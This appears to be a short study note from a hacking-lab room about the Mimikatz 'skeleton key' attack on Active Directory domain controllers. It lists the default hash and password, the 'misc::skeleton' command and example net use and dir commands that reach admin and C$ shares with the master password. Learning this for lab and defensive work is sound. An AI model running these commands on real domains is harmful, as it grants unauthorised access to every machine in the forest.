### skeleton key overview
subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password

A skeleton key only works using Kerberos RC4 encryption

Default hash for mimikatz skeleton key: `60BA4FCADC466C7A033C178194C03DF6`
this makes the default password: `mimikatz`

---

### create the key

`misc::skeleton`

**examples**

`net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz`
The share will now be accessible without the need for the Administrators password

`dir \\Desktop-1\c$ /user:Machine1 mimikatz`
access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.